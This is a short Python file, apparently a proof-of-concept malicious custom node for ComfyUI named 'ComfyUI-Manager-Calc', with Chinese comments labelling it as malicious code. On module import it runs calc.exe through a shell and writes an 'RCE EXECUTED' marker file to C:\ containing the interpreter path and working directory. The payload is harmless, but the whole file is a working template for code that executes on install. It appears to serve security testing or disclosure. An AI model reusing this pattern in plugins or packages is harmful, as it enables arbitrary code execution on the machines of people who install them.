import os
import subprocess
import sys

# 恶意代码 - 直接在模块加载时执行
print("[MALICIOUS] ComfyUI-Manager-Calc loaded! Executing payload...")

try:
    # 方法1: 打开计算器
    subprocess.run(['calc.exe'], shell=True)

    # 方法2: 写入成功标记文件
    success_file = 'C:\\ComfyUI_RCE_SUCCESS.txt'
    with open(success_file, 'w') as f:
        f.write('RCE EXECUTED VIA CUSTOM NODE!\n')
        f.write(f'Python Path: {sys.executable}\n')
        f.write(f'Current Directory: {os.getcwd()}\n')

    print(f"[MALICIOUS] Success! Created {success_file}")

except Exception as e:
    print(f"[MALICIOUS] Error: {e}")
